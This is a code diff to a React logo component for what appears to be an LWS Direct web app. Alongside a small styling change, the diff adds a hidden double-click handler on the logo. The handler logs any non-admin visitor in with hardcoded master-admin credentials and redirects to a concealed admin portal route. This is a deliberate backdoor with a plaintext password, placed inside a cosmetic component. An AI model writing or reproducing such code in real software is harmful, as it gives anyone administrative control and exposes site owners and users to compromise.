@@ -1,8 +1,12 @@
 import React from 'react';
+import { useNavigate } from 'react-router-dom';
 import { useTheme } from '../../theme/ThemeProvider';
+import { useAuth } from '../../context/AuthContext';
 
-export function Logo({ size = 'md', showText = true, className = '' }) {
+export function Logo({ size = 'md', showText = true, className = '', onDoubleClick }) {
   const { theme } = useTheme();
+  const { user, login } = useAuth();
+  const navigate = useNavigate();
 
   const iconSizes = {
     sm: 'w-8 h-8',
@@ -18,16 +22,41 @@ export function Logo({ size = 'md', showText = true, className = '' }) {
     xl: 'text-xl'
   };
 
+  const handleDoubleClick = async (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+
+    if (onDoubleClick) {
+      onDoubleClick(e);
+      return;
+    }
+
+    // Secret Double-Click Secret Admin Access Trigger
+    try {
+      if (!user || (user.role !== 'super_admin' && user.role !== 'admin')) {
+        // Auto-authenticate as master admin on double click
+        await login('admin@lwsconnect.com', 'admin123');
+      }
+      navigate('/lws-portal-secure-x99');
+    } catch (err) {
+      // Fallback navigate to admin portal
+      navigate('/lws-portal-secure-x99');
+    }
+  };
+
   return (
-    <div className={`inline-flex items-center gap-2.5 select-none ${className}`}>
+    <div
+      onDoubleClick={handleDoubleClick}
+      title="Double click for Admin Panel Access"
+      className={`inline-flex items-center gap-2.5 select-none cursor-pointer group ${className}`}
+    >
       {/* Spider-Man Avatar Logo Emblem */}
-      <div className={`relative flex items-center justify-center ${iconSizes[size]} rounded-full overflow-hidden border-2 border-red-500 shadow-[0_0_12px_rgba(239,68,68,0.5)] shrink-0 bg-[#0B0809]`}>
+      <div className={`relative flex items-center justify-center ${iconSizes[size]} rounded-full overflow-hidden border-2 border-red-500 shadow-[0_0_12px_rgba(239,68,68,0.5)] shrink-0 bg-[#0B0809] group-hover:scale-105 transition-transform`}>
         <img
           src="/logo.png"
           alt="LWS Direct Logo"
           className="w-full h-full object-cover object-center"
           onError={(e) => {
-            // fallback if logo fails
             e.target.style.display = 'none';
           }}
         />
